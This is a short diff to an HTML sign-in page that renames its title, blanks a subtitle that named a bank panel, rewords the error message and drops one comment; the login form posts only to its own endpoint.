@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Panel Login</title>
+  <title>Sign in</title>
   <link rel="preconnect" href="https://rsms.me">
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
@@ -37,7 +37,7 @@
 <body>
   <div class="login-card">
     <div class="login-title">Sign in</div>
-    <div class="login-sub">ING Secure Banking Panel</div>
+    <div class="login-sub"></div>
     <form id="loginForm" method="post" action="/panel/login" autocomplete="off">
       <div class="field">
         <label>User</label>
@@ -48,7 +48,7 @@
         <input name="pw" type="password" placeholder="••••••••" required>
       </div>
       <button type="submit" id="submitBtn">Continue</button>
-      <div class="error" id="error">Invalid credentials</div>
+      <div class="error" id="error">Access denied.</div>
     </form>
   </div>
 
@@ -57,7 +57,6 @@
     const btn  = document.getElementById('submitBtn');
     const err  = document.getElementById('error');
     
-    // Show error if ?fail=1
     if (new URLSearchParams(location.search).has('fail')) {
       err.style.display = 'block';
     }
